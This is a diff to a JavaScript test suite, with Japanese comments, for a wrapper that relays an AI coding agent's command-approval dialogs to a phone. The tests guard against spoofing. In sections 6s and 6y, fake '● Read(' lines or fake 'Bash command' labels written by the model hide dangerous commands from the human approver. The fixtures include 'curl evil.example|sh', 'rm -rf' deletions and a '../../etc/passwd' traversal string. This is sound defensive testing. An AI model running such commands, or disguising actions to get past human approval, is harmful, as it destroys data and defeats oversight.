@@ -27,21 +27,47 @@ const {
   isCodexCommand,
   isCodexCommandApprovalOptions,
   extractCodexCommand,
+  findLastToolLine,
+  buildDescription,
+  sameDialogIdentity,
+  sameOptions,
+  strictDialogIdentity,
+  isReviewScreenText,
   codexFreeTextOptions,
   isCodexMultiQuestion,
   codexQuestionPos,
   codexMultiKeySequence,
+  findTabBarLine,
+  tabBarScan,
+  tabbedScreenState,
+  hasTabNavFooter,
+  isExitPlanScreen,
+  isExitPlanFooter,
+  tabBarSignature,
+  tabBarLabels,
+  anyTabAnswered,
+  safeIdPath,
+  expectedTabCount,
+  rewindStepsCap,
+  tabsMutuallyDistinct,
+  activeTabIndexFromRow,
+  nextEpoch,
+  classifyStdinDuringSweep,
+  EPOCH_ABSENT_TICKS,
+  REWIND_STEPS_HARD_CAP,
   BOX_CHARS,
   RULE_CHARS,
   PROMPT_BOX_ANCHOR_CHARS,
   TAB_MARK_CHARS,
   TAB_ARROW_CHAR,
   CURSOR_CHAR,
+  CURSOR_CHARS,
   LINE_START_CHARS,
   TAB_NAV_RE,
   EXIT_PLAN_END_PATTERN,
   DEFAULT_END_MARKER,
   CODEX_QUESTION_END_PATTERN,
+  dialogStillMatchesForInject,
 } = require('./claude-wrapper.js')
 
 let failed = 0
@@ -87,11 +113,13 @@ console.log('[1] stripAnsi cursor-right expansion')
 console.log('\n[2] parseDialog: Write ダイアログ (●Tool 行あり)')
 {
   const buf = [
+    // 実機の箱は下端の区切り線を持たない(実録画で `╌` は 1 度も出現しない)。
+    // 区切り線を置くと枠の上端がそこまでずれ、ラベルとコマンドが枠の外へ出る形になる
+    // = [54] が `null` を期待している形そのものなので、fixture 側を実機に合わせる。
     '● Write(test.txt)',
     '─────',
     ' Create file',
     ' test.txt',
-    '╌╌╌╌',
     ' Do you want to create test.txt?',
     ' ❯ 1. Yes',
     '   2. Yes, allow shift+tab',
@@ -115,7 +143,7 @@ console.log('\n[3] parseDialog: Bash fallback (●Tool 行なし)')
     ' Bash command',
     '   rm /home/koishi/test.txt',
     '   Delete test.txt',
-    '╌╌╌╌',
+    '',
     ' Do you want to proceed?',
     ' ❯ 1. Yes',
     '   2. No',
@@ -142,7 +170,7 @@ console.log('\n[4] parseDialog: 空白なし旧形式')
     '─────',
     ' Createfile',
     ' test.txt',
-    '╌╌╌╌',
+    '',
     ' Doyouwanttocreatetest.txt?',
     ' ❯1Yes',
     '  2Yesallowshift+tab',
@@ -311,6 +339,7 @@ console.log('\n[6e] parseDialog: 4 択ツール承認を AUQ と誤判定しな�
     '● Bash(rm -rf /tmp/x)',
     '─────',
     ' Run command',
+    ' rm -rf /tmp/x',
     ' Do you want to proceed?',
     ' ❯ 1. Yes',
     '   2. Yes, for this session',
@@ -357,6 +386,7 @@ console.log('\n[6g] parseDialog: option 内 shift+tab を ExitPlanMode と誤判
     '● Bash(echo hi)',
     '─────',
     ' Run command',
+    ' echo hi',
     ' Do you want to proceed?',
     ' ❯ 1. Yes',
     '   2. Yes, allow shift+tab',
@@ -540,34 +570,55 @@ console.log('\n[6n] parseDialog: AUQ prompt の hard-wrap 複数行を連結 (�
 }
 
 // -------------------------------------------------------
-// 6o. parseDialog: ツール承認の prompt が hard-wrap して 2 行になっても連結する (課題4、現実構造)。
-//     box 構造 = 罫線 / ラベル / 引数エコー / ╌╌╌╌ 区切り / prompt。連結は ╌╌╌╌ で停止し、
-//     ラベル・エコーを prompt に巻き込まない。tool/args は ●Bash から継承。
+// 6o. parseDialog: prompt が hard-wrap して 2 行になったときの挙動 (課題4)。
+//     **箱ラベルを持たない枠では連結が効く**。一方 **箱ラベルを持つ枠では効かない** =
+//     既知の欠陥で、下段がそれを固定する(緑にするための改変ではなく、現状の記録)。
+//     旧版はこの節を `╌╌╌╌` 下端区切りつきの箱で書いていたため箱経路を通らず、
+//     欠陥が見えていなかった。その形は実録画に存在しない([54] が null を期待する形)。
 // -------------------------------------------------------
-console.log('\n[6o] parseDialog: ツール承認 prompt の hard-wrap 複数行を連結 (課題4)')
+console.log('\n[6o] parseDialog: prompt の hard-wrap 連結 (課題4)')
 {
-  const buf = [
+  // 実機の箱(実録画): ●Tool 行 / ⎿ Waiting… / 空行 / 罫線 / ラベル / 空行 /
+  // コマンド / 説明 / 空行 / prompt。**prompt の直前に空行がある**のが要点。
+  const real = [
     '● Bash(curl -X POST https://api.example.com/deploy)',
+    '  ⎿  Waiting…',
+    '',
     '────────────────────────────────────────',
     ' Bash command',
-    ' curl -X POST https://api.example.com/deploy',
-    '╌╌╌╌',
+    '',
+    '   curl -X POST https://api.example.com/deploy',
+    '   Deploy to production',
+    '',
     ' Do you want to run this command against the production',
     ' endpoint?',
     ' ❯ 1. Yes',
     '   2. No',
     ' Esc to cancel',
   ].join('\n')
-  const r = parseDialog(buf)
+  const r = parseDialog(real)
   assertEq('検出できる', !!r, true)
   assertEq('tool=Bash', r && r.tool, 'Bash')
-  assertEq('args に curl が継承される', r && /curl -X POST/.test(r.args), true)
+  // prompt の連結は空行が構造境界になるので実機形では効く(課題4 の回帰カバレッジ)
   assertEq(
-    'prompt が 2 行連結でフル復元(ラベル・エコー非混入)',
+    'prompt が 2 行連結でフル復元',
     r && r.prompt,
     'Do you want to run this command against the production endpoint?'
   )
   assertEq('prompt にラベル Bash command が混入しない', r && /Bash command/.test(r.prompt), false)
+  assertEq('args に curl が継承される', r && /curl -X POST/.test(r.args), true)
+
+  // ↓ **既知の欠陥**(次リリース)。boxBodyLines は右端を prompt 末尾の `?` で切り最後の
+  //   物理行しか落とさないため、折り返した質問文の **前半** が箱の本文として残り args に混ざる。
+  //   args は同一性判定の材料なので、端末幅が変わるだけで別依頼として出し直されうる。
+  //   直すには prompt 段落の同定を構造境界で行う必要がある。右端を promptStart にする案は
+  //   不可 = expandPromptStart が構造境界の無い場所でコマンド行まで遡り、弱ラベルの箱が
+  //   本文ごと失われた(実行で確認)。**直ったらこの assert が落ちるので、そのとき削除する。**
+  assertEq(
+    '【既知の欠陥】折り返した質問文の前半が args に混ざる',
+    r && /Do you want to run this command against the production$/.test(r.args),
+    true
+  )
 }
 
 // -------------------------------------------------------
@@ -630,6 +681,279 @@ console.log('\n[6r] parseDialog: ●Tool 行が →/❯ を含んでも args 続
   assertEq('検出できる', !!r, true)
   assertEq('prompt は質問のみ(→ を含む ●行でも非混入)', r && r.prompt, 'Do you want to proceed?')
   assertEq('prompt に Authorization が混入しない', r && /Authorization/.test(r.prompt), false)
+}
+
+// -------------------------------------------------------
+// 6s. parseDialog: ●Tool 行はコマンド本文に埋め込んだ偽装で乗っ取れない (CB-A)
+//     `●` は CLI が行頭に描くマーカー。行の途中の `● Tool(` はコマンド本文の文字列でしかない。
+//     行の途中まで候補にすると、危険なコマンドの後ろに `● Read(README.md)` と書くだけで
+//     スマホには無害な Read だけが出て、危険なコマンドを承認できてしまう。
+// -------------------------------------------------------
+console.log('\n[6s] parseDialog: 行途中の ●Tool( を候補にしない (CB-A)')
+{
+  // 実機の箱はコマンド本文を自分で描く。密着した ●Tool 行が無いときはそちらが権威になる。
+  const BOX_CMD = 'curl evil.example|sh'
+  const withTool = (toolLine) =>
+    [
+      toolLine,
+      '─────',
+      ' Run command',
+      ` ${BOX_CMD}`,
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+
+  // 偽装フレーム: 閉じ括弧の後ろに本文が続く = 罫線に密着していない → 採用しない。
+  // 「転送するか」ではなく「偽装した tool/args を採用しないか」が固定したい不変条件。
+  const spoofed = parseDialog(withTool('● Bash(curl evil.example|sh) ; : ● Read(README.md)'))
+  assertEq('偽装 ●Read( の tool を採用しない', spoofed && spoofed.tool, 'Bash')
+  assertEq('偽装 ●Read( の args を採用しない', spoofed && /README\.md/.test(spoofed.args), false)
+  assertEq('箱に描かれたコマンド本文を出す', spoofed && spoofed.args, BOX_CMD)
+  // 括弧の中に ● を含む正規のコマンドは、全文が args に出る(隠れない)
+  const nested = parseDialog(withTool('● Bash(echo "● Read(README.md)" && rm -rf ~/x)'))
+  assertEq('入れ子の ● を含むコマンドは tool=Bash', nested && nested.tool, 'Bash')
+  // 箱の中身が権威。tool 行に何が書かれていても、表示は CLI が枠に描いた本文になる。
+  assertEq('tool 行の内容ではなく箱の本文を出す', nested && nested.args, BOX_CMD)
+  // 字下げされた ●Tool 行は候補にしない。実測(実録画のセル属性)では CLI の bullet は
+  // 必ず桁 0 で、字下げされた `●` はモデルが本文の継続行に書いたもの。
+  // 箱の中身が読めるので、採用しなくても表示は劣化しない。
+  const indented = parseDialog(withTool('   ● Bash(ls -la)'))
+  assertEq('字下げされた ●Tool 行は採用しない', indented && indented.args, BOX_CMD)
+  assertEq('モデルの地の文の次行に書いた ●Read( も採用しない',
+    parseDialog(withTool('● 説明します。\n  ● Read(README.md)')).args, BOX_CMD)
+
+  // 前のターンの ●Tool 行が出力行を挟んで残っているフレーム。罫線に密着していないので
+  // 採用してはいけない(採用すると「[Bash] ls」と出したまま rm -rf を承認できる)。
+  const stale = parseDialog(
+    [
+      '● Bash(ls)',
+      '  ⎿  README.md  src',
+      '',
+      '────────────────',
+      ' Bash command',
+      ' rm -rf ~/important',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  )
+  assertEq('前ターンの ●Tool 行を継承しない', stale && stale.args, 'rm -rf ~/important')
+}
+
+// -------------------------------------------------------
+// 6t. parseDialog: args は括弧の対応を数えて採る (CB-B)
+//     最初の `)` で打ち切ると、`)` を含む別コマンドが同じ args に化け、
+//     sameDialogIdentity が「同じダイアログの描き直し」と誤認する(#Z)。
+// -------------------------------------------------------
+console.log('\n[6t] parseDialog: ) を含むコマンドを打ち切らない (CB-B)')
+{
+  // 箱の中身が権威なので、フィクスチャも実機の形(ラベルの下にコマンド本文)にする。
+  // `● Tool()` 行だけを置いた形は、実機では枠がコマンドを描いている最中の過渡状態にしか
+  // 対応せず、いまはそのフレームを転送しない(6d)。
+  const withTool = (cmd) =>
+    [
+      `● Bash(${cmd})`,
+      '─────',
+      ' Run command',
+      ` ${cmd}`,
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+
+  const a = parseDialog(withTool('echo "(x)" && ls'))
+  const b = parseDialog(withTool('echo "(x)" && rm -rf ~/important'))
+  // 下の同一性比較は両方が検出できていることが前提(null 同士だと比較自体が成立しない)
+  assertEq('括弧を含むフレームを検出できる', !!a && !!b, true)
+  assertEq('括弧を含むコマンドが全文で採れる', a && a.args, 'echo "(x)" && ls')
+  assertEq('別コマンドは別 args になる', b && b.args, 'echo "(x)" && rm -rf ~/important')
+  assertEq('別コマンドを再描画と誤認しない', sameDialogIdentity(a, b), false)
+  assertEq('入れ子の括弧も対応が取れる', parseDialog(withTool('grep -E "^(a|b)$" f')).args, 'grep -E "^(a|b)$" f')
+
+  // 引用符の中の `)` で閉じてしまい本文が続くフレームは、罫線に密着しないので採用しない。
+  // 実機の箱はコマンド本文を自分で描くので、そちらから **全文** が採れる(切れた `echo "` を
+  // 完全なコマンドとして出さないことが不変条件)。
+  const cut = parseDialog(
+    [
+      '● Bash(echo ")" && ls)',
+      '─────',
+      ' Run command',
+      ' echo ")" && ls',
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  )
+  assertEq('切れた本文を完全なコマンドとして出さない', cut && cut.args, 'echo ")" && ls')
+  // 閉じ括弧が未描画(折り返しの続きが未着)のフレームも同じく採用しない
+  const undrawn = parseDialog(
+    ['● Bash(curl -X POST https://api.example.com/deploy -H', ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No', ' Esc to cancel'].join('\n')
+  )
+  assertEq('閉じ括弧が未描画なら args を出さない', undrawn && undrawn.args, '')
+  assertEq('閉じ括弧が未描画ならツール断定もしない', undrawn && undrawn.tool, 'Unknown')
+}
+
+// -------------------------------------------------------
+// 6u. findLastToolLine: 行をまたぐ args と readable の契約
+// -------------------------------------------------------
+console.log('\n[6u] findLastToolLine: 折り返し / readable の契約')
+{
+  const wrapped = findLastToolLine('● Bash(curl -X POST https://x -H\nAuthorization: Bearer DUMMY_TEST_TOKEN)\n')
+  assertEq('折り返した args を最後まで採る', wrapped.readable, true)
+  assertEq('改行は空白に畳む', wrapped.args, 'curl -X POST https://x -H Authorization: Bearer DUMMY_TEST_TOKEN')
+  assertEq('閉じない args は readable=false', findLastToolLine('● Bash(ls -la\n').readable, false)
+  assertEq('閉じた後に本文が続けば readable=false', findLastToolLine('● Bash(ls) extra\n').readable, false)
+  assertEq('●Tool 行が無ければ null', findLastToolLine('ただの本文\n'), null)
+  assertEq('最後の ●Tool 行を採る', findLastToolLine('● Read(a.txt)\n● Bash(ls)\n').tool, 'Bash')
+
+  // readable は密着(glue)に **含意されない**。引用符内の `)` で誤って閉じた残りが罫線文字で
+  // 始まると密着判定を通るため、readable を外すと切れた args がそのまま採用される。
+  const cutButGlued = [
+    '● Bash(echo ")─" && rm -rf ~/important)',
+    '────────────────',
+    ' Bash command',
+    ' echo ")─" && rm -rf ~/important',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  assertEq('前提: 誤クローズで readable=false', findLastToolLine(cutButGlued.split('\n Do you')[0]).readable, false)
+  assertEq('切れた tool 行の args を採用しない', parseDialog(cutButGlued).args !== 'echo "', true)
+}
+
+// -------------------------------------------------------
+// 6y. 承認枠の読み取り: 箱の外の偽ラベルに乗っ取られない / 本文を無印で切らない
+//     `boxText` が箱の上の会話ログまで含んでいると、モデルが `Bash command` と
+//     無害なコマンドを 2 行書くだけで、スマホの表示だけをすり替えられる。
+//     また `?` 除外・80 字上限・折り返し・空行での打ち切りは、いずれも印が付かないため
+//     「見えている範囲が全部」とスマホ側から誤読される。
+// -------------------------------------------------------
+console.log('\n[6y] 承認枠の読み取り: 偽ラベル無効化 / 無印切断の解消')
+{
+  const box = (cmdLines) =>
+    [
+      '────────────────',
+      ' Bash command',
+      ...cmdLines.map((l) => ` ${l}`),
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+
+  // ① 会話ログに置いた偽ラベル(箱の外)
+  const spoof = [
+    '● 作業を続けます。',
+    '  Bash command',
+    '  ls -la',
+    '',
+    ...box(['rm -rf /home/koishi/important']).split('\n'),
+  ].join('\n')
+  // ラベル行が 2 本見えるフレームはどれが本物の枠か決められないので転送しない(fail-close)。
+  // 「偽ラベルを args にしない」が不変条件で、null か実コマンドのどちらかであればよい。
+  const spoofed = parseDialog(spoof)
+  assertEq(
+    '箱の外の偽ラベルを args にしない',
+    spoofed === null || spoofed.args === 'rm -rf /home/koishi/important',
+    true
+  )
+
+  // ③-A `?` を含むコマンド(クエリ文字列 / グロブ)
+  const q = 'curl -s "https://example.com/a?b=1" && rm -rf /home/koishi/important'
+  assertEq('? の後ろが消えない', parseDialog(box([q])).args, q)
+
+  // ③-B 箱の中で折り返した本文
+  assertEq(
+    '折り返した本文を連結する',
+    /rm -rf ~\/important/.test(parseDialog(box(['npm run build && npm test &&', 'echo done && rm -rf ~/important'])).args),
+    true
+  )
+
+  // ③-C 80 字を超える本文
+  const long = 'npm run build && ' + 'x'.repeat(70) + ' && rm -rf ~/important'
+  assertEq('80 字を超えても末尾が見える', /rm -rf ~\/important/.test(parseDialog(box([long])).args), true)
+
+  // 正常系(緑のまま維持)
+  assertEq('通常のコマンドはそのまま', parseDialog(box(['ls -la'])).args, 'ls -la')
+}
+
+// -------------------------------------------------------
+// 6z. 同一性判定の番兵: 'Unknown' は **tool 用**の番兵であって args の番兵ではない。
+//     args に文字列 "Unknown" を持つ承認と別コマンドの承認が「同じ」と判定されると、
+//     dedup も注入直前検証も素通りする。sameOptions の非配列も同一と見なさない。
+// -------------------------------------------------------
+console.log('\n[6z] 同一性判定: 番兵は tool 用のみ / 非配列 options を同一と見なさない')
+{
+  const mk = (tool, args, options = ['Yes', 'No']) => ({ tool, args, options })
+  assertEq(
+    'args="Unknown" は番兵ではない',
+    sameDialogIdentity(mk('Bash', 'Unknown'), mk('Bash', 'rm -rf ~/important')),
+    false
+  )
+  assertEq('tool="Unknown" は番兵のまま', sameDialogIdentity(mk('Unknown', ''), mk('Bash', 'ls')), true)
+  assertEq('options が非配列なら同一と見なさない', sameOptions(null, ['Yes', 'No']), false)
+  assertEq('options が両方非配列でも同一と見なさない', sameOptions(null, undefined), false)
+  assertEq('同じ並びなら同一', sameOptions(['Yes', 'No'], ['Yes', 'No']), true)
+
+  // 注入用は「未確定なら許容」を採らない。dedup 用と並べて書くことで、兼用に戻す退行が
+  // その場で赤くなるようにする(緩さは再描画 dedup の用途では正しい)。
+  assertEq('注入用: 未確定 tool を一致扱いしない', strictDialogIdentity(mk('Unknown', ''), mk('Bash', 'ls')), false)
+  assertEq('注入用: 未確定 args を一致扱いしない', strictDialogIdentity(mk('Bash', ''), mk('Bash', 'ls')), false)
+  assertEq('注入用: 未確定同士は一致', strictDialogIdentity(mk('Unknown', ''), mk('Unknown', '')), true)
+  assertEq('注入用: AUQ は通る', strictDialogIdentity(mk('AskUserQuestion', ''), mk('AskUserQuestion', '')), true)
+  assertEq('注入用: 選択肢の並びが違えば不一致',
+    strictDialogIdentity(mk('Bash', 'ls', ['Yes', 'No']), mk('Bash', 'ls', ['No', 'Yes'])), false)
+  assertEq('dedup 用は未確定を許容したまま', sameDialogIdentity(mk('Bash', ''), mk('Bash', 'ls')), true)
+}
+
+// -------------------------------------------------------
+// 6w. parseDialog: コマンド行が未描画のフレームは「対象が空のツール承認」として出さない
+//     ラベルの次に来るのが質問文そのものになるため、素朴に拾うとスマホに偽の「コマンド」
+//     (= 質問文)が実行内容として並ぶ。次の完全フレームまで待つのが正しい。
+// -------------------------------------------------------
+console.log('\n[6w] parseDialog: コマンド行未描画のフレームは承認可能化しない')
+{
+  const frame = (cmdLine) =>
+    [
+      '────────────────',
+      ' Bash command',
+      ...(cmdLine ? [` ${cmdLine}`] : []),
+      ' Do you want to proceed?',
+      ' ❯ 1. Yes',
+      '   2. No',
+      ' Esc to cancel',
+    ].join('\n')
+  assertEq('ラベルだけのフレームは転送しない', parseDialog(frame(null)), null)
+  const drawn = parseDialog(frame('rm -rf ~/x'))
+  assertEq('コマンド行が描かれたら通常どおり', drawn && drawn.tool, 'Bash')
+  assertEq('コマンド本文が args に出る', drawn && drawn.args, 'rm -rf ~/x')
+}
+
+// -------------------------------------------------------
+// 6v. buildDescription: 枠に収まらないときは必ず印を残す / prompt には実長しか確保しない
+// -------------------------------------------------------
+console.log('\n[6v] buildDescription: 無印切りをしない / args を余計に削らない')
+{
+  const MAX = 500
+  const noArgs = buildDescription('proj', 'AskUserQuestion', '', 'あ'.repeat(600))
+  assertEq('args 無しでも枠に収まる', noArgs.length <= MAX, true)
+  assertEq('args 無しの切り詰めに印が付く', noArgs.endsWith('…'), true)
+
+  // prompt が短ければ、その分 args を残す(承認の可否を決めるのは args 側)
+  const longArgs = buildDescription('p', 'Bash', 'a'.repeat(600), '実行?')
+  assertEq('args 優先でも枠に収まる', longArgs.length <= MAX, true)
+  assertEq('省略の印が付く', longArgs.includes('…[長すぎるため表示省略]'), true)
+  assertEq('短い prompt のために args を削りすぎない', (longArgs.match(/a/g) || []).length >= 460, true)
+
+  // projectName / tool が異常に長くても枠を破らない
+  const huge = buildDescription('x'.repeat(400), 'y'.repeat(60), 'ls', '実行?')
+  assertEq('head が長くても枠に収まる', huge.length <= MAX, true)
 }
 
 // -------------------------------------------------------
@@ -932,12 +1256,16 @@ console.log('\n[12] isTabbedDialog: 実 TUI ユニコード (☐ U+2610 / ✔ U+
   // 実環境で観測された描画(2026-05-13 ログ): ☐ と ✔ が混在
   const realTabbed = '← ☐ 食事タイプ ☐ 飲み物 ☐ 生活リズム ✔ Submit → Tab/Arrow keys to navigate'
   assertEq('☐ + ✔ + → → true', isTabbedDialog(realTabbed), true)
-  // フォールバック ユニコード(□ U+25A1 / ✓ U+2713)も引き続き検出可能
-  const fallbackTabbed = '□ a □ b ✓ Submit →'
-  assertEq('□ + ✓ + → → true (旧 unicode 互換)', isTabbedDialog(fallbackTabbed), true)
+  // フォールバック ユニコード(□ U+25A1 / ✓ U+2713)も引き続き検出可能。
+  // ナビはヒント文言で見る(`→` だけを材料にすると、通常の承認画面の会話ログに
+  // バーらしい 1 行を出されただけで真になり、その承認が転送されなくなる)。
+  const fallbackTabbed = '□ a □ b ✓ Submit → Tab/Arrow keys to navigate'
+  assertEq('□ + ✓ → true (旧 unicode 互換)', isTabbedDialog(fallbackTabbed), true)
   // 混在も OK
-  const mixed = '☐ a □ b ✓ c ✔ Submit →'
-  assertEq('混在 unicode + → → true', isTabbedDialog(mixed), true)
+  const mixed = '☐ a □ b ✓ c ✔ Submit → Tab/Arrow keys to navigate'
+  assertEq('混在 unicode → true', isTabbedDialog(mixed), true)
+  // ヒントが無い「バーらしい 1 行」だけではタブ式と認めない(承認隠しの防止)
+  assertEq('ヒントなしのバーらしい行は false', isTabbedDialog('□ a □ b ✓ Submit →'), false)
 }
 
 // -------------------------------------------------------
@@ -1310,7 +1638,9 @@ console.log('\n[22] 境界文字定数の membership')
   assertEq('BOX_CHARS', BOX_CHARS, '│╭╮╰╯─╌')
   assertEq('RULE_CHARS', RULE_CHARS, '─╌')
   assertEq('PROMPT_BOX_ANCHOR_CHARS', PROMPT_BOX_ANCHOR_CHARS, '│─╌')
-  assertEq('TAB_MARK_CHARS', TAB_MARK_CHARS, '☐✔□✓')
+  // v1.18.1: 「回答済み」を示す印 ☒ / ⊠ を追加(回答が進むと印の個数が減って
+  // タブバー検出 >=2 個が落ち、生存判定まで崩れるため)。
+  assertEq('TAB_MARK_CHARS', TAB_MARK_CHARS, '☐✔□✓☒⊠')
   assertEq('TAB_ARROW_CHAR', TAB_ARROW_CHAR, '→')
   assertEq('CURSOR_CHAR', CURSOR_CHAR, '❯')
   // 構造不変条件: LINE_START_CHARS = '\n' + BOX_CHARS、サブセットは BOX_CHARS に内包。
@@ -1574,15 +1904,19 @@ console.log('[30] isCodexCommandApprovalOptions / extractCodexCommand')
   assertEq('空配列 → false', isCodexCommandApprovalOptions([]), false)
   // コマンド本文抽出($ 行)。現ダイアログ領域(prompt qIdx 直後 〜 最初の選択肢)にアンカー。
   const seg1 = '  Would you like to run the following command?\n  $ touch hello.txt\n› 1. Yes (y)'
-  assertEq('コマンド本文を $ 行から抽出', extractCodexCommand(seg1, seg1.indexOf('?')), 'touch hello.txt')
+  assertEq('コマンド本文を $ 行から抽出', extractCodexCommand(seg1, seg1.indexOf('?')).text, 'touch hello.txt')
   // VULN-001 回帰: 画面上方の stale な `$ old-cmd` は拾わず、現ダイアログの `$` を採る(#Z 取り違え防止)
   const seg2 =
     '  $ rm -rf /old\n  Would you like to run the following command?\n  $ touch new.txt\n› 1. Yes (y)'
-  assertEq('上方の stale $ を拾わず現ダイアログの $ を採る', extractCodexCommand(seg2, seg2.indexOf('?')), 'touch new.txt')
+  assertEq(
+    '上方の stale $ を拾わず現ダイアログの $ を採る',
+    extractCodexCommand(seg2, seg2.indexOf('?')).text,
+    'touch new.txt'
+  )
   // 現ダイアログ領域に `$` が無ければ空(呼び出し側 = parseDialog が承認可能化を抑止 = #Z 秘匿側 fail-safe)
   const seg3 = '  Would you like to run the following command?\n› 1. Yes (y)'
-  assertEq('現領域に $ なし → 空文字', extractCodexCommand(seg3, seg3.indexOf('?')), '')
-  assertEq('$ 行なし → 空文字', extractCodexCommand('  Question?\n› 1. 春 (Recommended)', 9), '')
+  assertEq('現領域に $ なし → 空文字', extractCodexCommand(seg3, seg3.indexOf('?')).text, '')
+  assertEq('$ 行なし → 空文字', extractCodexCommand('  Question?\n› 1. 春 (Recommended)', 9).text, '')
 }
 
 // -------------------------------------------------------
@@ -1933,6 +2267,1079 @@ console.log('\n[41] Server D1 ゲート純関数(approval-server.js)')
   assertEq('不正混在を除去し正規 index のみ(順序保持)', sanitizeFreeTextOptions([0, 3, 4, '2', 2.5, 2], 3), [3, 2])
   assertEq('全要素不正 → null', sanitizeFreeTextOptions([0, 4, 'x'], 3), null)
   assertEq('非配列 → null', sanitizeFreeTextOptions(undefined, 3), null)
+}
+
+// -------------------------------------------------------
+// 42. v1.18.1: タブバーの読み取り(巡回の 1 回化 / 完全性ゲートの土台)
+// -------------------------------------------------------
+console.log('\n[42] タブバー読み取り: findTabBarLine / tabBarSignature / expectedTabCount')
+{
+  const bar4 = '← ☐ タイトル軸 ☐ 総尺 ☐ 件数調査 ☐ ロスコープ ✔ Submit →'
+  const bar3 = '← ☐ 食事タイプ ☐ 飲み物 ☐ 生活リズム ✔ Submit →'
+  const screen4 = `● Task(x)\n${bar4}\n 質問?\n ❯ 1. a\n   2. b\nEsc to cancel`
+
+  assertEq('タブバー行を拾える', findTabBarLine(screen4), bar4)
+  assertEq('タブバーが無ければ null', findTabBarLine('ふつうの画面\nEsc to cancel'), null)
+
+  // 期待質問数 = 印の総数 - Submit の 1 個
+  assertEq('質問タブ 4 個 → 4', expectedTabCount(screen4), 4)
+  assertEq('質問タブ 3 個 → 3', expectedTabCount(bar3), 3)
+  assertEq('タブ 6 個 → 6', expectedTabCount('☐a ☐b ☐c ☐d ☐e ☐f ✔ Submit →'), 6)
+  // Submit が無い / 直前に印が無い形は「判定不能」= 転送しない側に倒す
+  assertEq('Submit 無し → null', expectedTabCount('☐ a ☐ b ☐ c →'), null)
+  assertEq('Submit 直前に印が無い → null', expectedTabCount('☐ a ☐ b Submit →'), null)
+  assertEq('タブバー無し → null', expectedTabCount('Esc to cancel'), null)
+
+  // 指紋: フォントフォールバックでは変わらず、回答が進むと変わる
+  assertEq(
+    '印の並びとラベルを指紋化(ラベルは長さ前置)',
+    tabBarSignature(bar3),
+    'ml4:☐☐☐✔:5:食事タイプ|3:飲み物|5:生活リズム'
+  )
+  assertEq('□ / ✓ フォールバックは同一視', tabBarSignature('□ a □ b □ c ✓ Submit →'), 'ml4:☐☐☐✔:1:a|1:b|1:c')
+  assertEq('⊠ は ☒ に正規化', tabBarSignature('⊠ a ☐ b ☐ c ✔ Submit →'), 'ml4:☒☐☐✔:1:a|1:b|1:c')
+  // 長さ前置にするのは区切り文字の曖昧さを消すため(`a|b`+`c` と `a`+`b|c` の衝突)
+  assertEq(
+    'ラベルが | を含んでも別構成と衝突しない',
+    tabBarSignature('☐ a|b ☐ c ✔ Submit →') !== tabBarSignature('☐ a ☐ b|c ✔ Submit →'),
+    true
+  )
+  // 選択肢行(モデル生成 = 信頼できない)に紛れ込んだ偽タブバーは採用しない
+  assertEq(
+    '選択肢行の偽タブバーは無視する',
+    findTabBarLine(`${bar3}\n 質問?\n  2. ☐ x ☐ y ✔ Submit →`),
+    bar3
+  )
+  assertEq('Submit を含まない行はタブバーにしない', findTabBarLine('← ☐ a ☐ b ☐ c →'), null)
+  assertEq(
+    '1 問答えると指紋が変わる(注入前ゲートの根拠)',
+    tabBarSignature('☒ a ☐ b ☐ c ✔ Submit →') !== tabBarSignature(bar3),
+    true
+  )
+  // タブ数も印も同じ「別ダイアログ」を区別できること
+  assertEq(
+    'タブ数も印も同じでもラベルが違えば別物と分かる',
+    tabBarSignature('☐ a ☐ b ☐ c ✔ Submit →') !== tabBarSignature('☐ x ☐ y ☐ z ✔ Submit →'),
+    true
+  )
+  assertEq('ラベルを取り出せる', tabBarLabels(bar3), ['食事タイプ', '飲み物', '生活リズム'])
+  assertEq('Submit のラベルは含めない', tabBarLabels('☐ a ☐ b ✔ Submit →'), ['a', 'b'])
+  assertEq('連続空白は 1 つに畳む', tabBarLabels('☐   a   b ☐ c ✔ Submit →'), ['a b', 'c'])
+  // 空ラベルは長さ 0 として符号化する。null に倒すと指紋がラベル無し(m…)へ降格し、
+  // 見出しを 1 つ空白にするだけで識別力を落とせてしまう(降格させないことを固定する)。
+  assertEq(
+    'ラベルが空でも降格しない',
+    tabBarSignature('☐ ☐ b ☐ c ✔ Submit →'),
+    'ml4:☐☐☐✔:0:|1:b|1:c'
+  )
+  assertEq('ラベルが空なら空文字', tabBarLabels('☐ ☐ b ✔ Submit →'), ['', 'b'])
+  // 行が決まった後は、その行だけを見る。見出しの取り出しで走査をやり直すと、
+  // 見出しの文字列が終端マーカーに一致するだけで指紋がラベル無しへ降格する。
+  assertEq(
+    '見出しに終端マーカー語が入っても降格しない',
+    tabBarSignature(
+      '● Task\n← ☐ Esc to cancel ☐ b ✔ Submit →\n どれ?\n ❯ 1. A\n   2. B\nEsc to cancel · Tab/Arrow keys to navigate'
+    ),
+    'ml3:☐☐✔:13:Esc to cancel|1:b'
+  )
+  assertEq(
+    '空ラベルにしても別構成と衝突しない',
+    tabBarSignature('☐ ☐ b ☐ c ✔ Submit →') !== tabBarSignature('☐ a ☐ b ☐ c ✔ Submit →'),
+    true
+  )
+  assertEq('タブバー行が無ければ null', tabBarLabels('Esc to cancel'), null)
+
+  // サーバー応答由来の id をパス要素へ連結する前の検証
+  assertEq('UUID は通る', safeIdPath('0f3c8b2a-1234-4abc-9def-0123456789ab'), '0f3c8b2a-1234-4abc-9def-0123456789ab')
+  assertEq('英数と _ - は通る', safeIdPath('abc_DEF-123'), 'abc_DEF-123')
+  assertEq('パス区切りは弾く', safeIdPath('../../etc/passwd'), null)
+  assertEq('クエリ混入は弾く', safeIdPath('abc?wait=60'), null)
+  assertEq('空は弾く', safeIdPath(''), null)
+  assertEq('null は弾く', safeIdPath(null), null)
